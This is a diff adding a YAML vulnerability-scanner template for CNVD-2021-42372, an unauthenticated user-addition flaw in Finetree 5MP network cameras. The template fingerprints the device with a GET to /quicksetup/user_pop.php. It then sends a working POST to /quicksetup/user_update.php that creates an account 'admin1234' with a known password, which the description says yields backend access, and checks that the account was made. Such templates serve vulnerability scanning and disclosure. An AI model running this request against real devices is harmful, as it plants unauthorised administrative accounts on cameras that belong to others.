@@ -1,0 +1,44 @@
+id: CNVD-2021-42372
+
+info:
+  name: Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞
+  author: zan8in
+  severity: high
+  description: |
+    Finetree 5MP 摄像机 user_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限
+    p="Finetree-5MP-Network-Camera"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/Finetree/Finetree%205MP%20%E6%91%84%E5%83%8F%E6%9C%BA%20user_pop.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-42372.html
+  tags: 5MP-Network-Camera
+
+flow: |
+  http("r0") && http("r1")
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        GET /quicksetup/user_pop.php?method=add HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"name=\"user_name_field\"") && contains(body,"name=\"password_field\"") && contains(body,"name=\"confirm_password_field\"")
+        condition: and
+
+  - id: "r1"
+    raw:
+      - |
+        POST /quicksetup/user_update.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"\"WintenDo\"") && (contains(body,"200") || contains(body,"804"))
+        condition: and
+
